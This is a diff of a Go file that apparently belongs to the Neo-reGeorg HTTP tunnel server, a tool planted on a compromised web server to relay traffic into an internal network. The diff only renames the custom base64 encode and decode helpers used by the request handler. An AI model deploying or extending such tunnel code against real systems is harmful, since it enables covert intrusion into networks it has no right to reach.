@@ -43,7 +43,7 @@ func zip(tomap map[byte]byte, a []byte, b []byte) {
 	}
 }
 
-func base64decodes(data []byte) ([]byte, error) {
+func selfbase64decode(data []byte) ([]byte, error) {
 	size := len(data)
 	out := make([]byte, size)
 	for i := 0; i < size; i++ {
@@ -57,7 +57,7 @@ func base64decodes(data []byte) ([]byte, error) {
 	return base64.StdEncoding.DecodeString(string(out))
 }
 
-func base64encodes(rawdata []byte) []byte {
+func selfbase64encode(rawdata []byte) []byte {
 	data := []byte(base64.StdEncoding.EncodeToString(rawdata))
 	size := len(data)
 	out := make([]byte, size)
@@ -180,7 +180,7 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 	data, _ := ioutil.ReadAll(r.Body)
 
-	out, err := base64decodes(data)
+	out, err := selfbase64decode(data)
 	if err == nil && len(out) != 0 {
 		info := blv_decode(out)
 		rinfo := make(map[int][]byte)
@@ -242,15 +242,15 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 			}
 
 		default:
-			hello, _ := base64decodes(neoreg_hello)
+			hello, _ := selfbase64decode(neoreg_hello)
 			fmt.Fprintf(w, "%s", hello)
 			return
 		}
 
 		data := blv_encode(rinfo)
-		fmt.Fprintf(w, "%s", base64encodes(data))
+		fmt.Fprintf(w, "%s", selfbase64encode(data))
 	} else {
-		hello, _ := base64decodes(neoreg_hello)
+		hello, _ := selfbase64decode(neoreg_hello)
 		fmt.Fprintf(w, "%s", hello)
 	}
 
